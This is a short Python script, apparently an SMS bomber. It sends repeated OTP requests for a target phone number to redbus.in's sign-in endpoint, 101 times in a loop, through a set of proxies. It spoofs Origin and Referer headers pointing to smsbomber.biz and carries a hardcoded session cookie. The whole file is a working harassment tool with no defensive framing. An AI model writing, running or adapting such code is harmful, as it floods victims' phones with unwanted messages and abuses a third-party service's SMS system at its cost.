import requests
import time

def bombus(number):
    r=requests.session()
    url="https://www.redbus.in/Personalization/SendOTP?mobile={}&phoneCode=91&OTPSource=SIGNIN".format(number)
    proxy={'http':'45.7.231.86','http':'66.42.107.87:8080','http':'68.183.99.96:8080'}
    headers={"Host":"www.redbus.in",
            "Connection": "close",
            "Origin": "https://smsbomber.biz",
            "User-Agent": "Mozilla/5.0 (X11; Linux 64) AppleWebKit/547.36 (KHTML, like Gecko) Chrome/70.0.3383.203 Safari/337.35",
            "DNT": "1",
            "Accept": "*/*",
            "Referer": "https://smsbomber.biz/bomb.php",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "Cookie": "jfpj=b538ab3ac87701158bde432b134e431d; country=IND; currency=INR; selectedCurrency=INR; language=en; deviceSessionId=c7352b25-7107-43f2-af58-12e747m85edd; lzFlag=1; bCore=1; defaultCountry=IND"}
    print(r.get(url,headers=headers,proxies=proxy).text)

def kill(number):
    for i in range(101):
        try:
            bombus(number)
            time.sleep(10)
        except:
            pass
